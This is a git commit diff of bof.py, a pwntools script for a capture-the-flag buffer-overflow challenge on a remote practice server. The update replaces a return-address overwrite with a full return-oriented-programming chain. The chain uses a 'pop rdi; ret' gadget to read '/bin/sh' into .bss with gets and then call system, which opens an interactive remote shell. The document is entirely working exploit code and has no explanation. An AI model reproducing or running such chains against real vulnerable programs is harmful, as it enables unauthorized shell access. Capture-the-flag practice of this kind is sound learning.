0cadd7ff45a935d4d91da430683318e5143dba17
r888800009 <r888800009@gmail.com>
2019-08-03 12:09:13 +0800

    Update bof.py

--- ctf.bitx.tw/bof.py
+++ ctf.bitx.tw/bof.py
@@ -1,7 +1,21 @@
 #!/usr/bin/env python2
 from pwn import *
+import pwnlib.elf
 
 c = remote('ctf.bitx.tw', 10101)
-c.sendline("A" * (0x40) + p64(0x0000000000400636))
+e = ELF('bof')
+
+ans = '\0' * (0x40 + 8)
+ans += p64(0x400723) # pop rdi ; ret
+ans += p64(e.bss() + 100)
+ans += p64(e.plt['gets'])
+ans += p64(0x400723) # pop rdi ; ret
+ans += p64(e.bss() + 100)
+ans += p64(e.plt['system'])
+c.sendline(ans)
+
+ans = '/bin/sh'
+c.sendline(ans)
+
 c.interactive()
 c.close()
